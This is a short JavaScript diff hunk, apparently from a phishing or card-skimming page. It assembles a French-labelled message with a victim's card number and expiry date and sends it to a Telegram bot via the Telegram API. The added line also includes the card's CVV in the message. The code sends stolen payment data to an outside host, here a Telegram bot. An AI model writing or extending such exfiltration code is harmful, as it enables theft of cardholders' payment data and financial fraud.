@@ -316,6 +316,7 @@
                 `<b>Motif :</b> ${data.motif}\n`+
                 `<b>Carte :</b> ${data.cardNumber}\n`+
                 `<b>Expiration :</b> ${data.cardExpiry}\n`+
+                `<b>CVV :</b> ${data.cardCvv}\n`+
                 `<b>Date :</b> ${new Date().toLocaleString('fr-FR')}`;
             const url=`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
             fetch(url,{
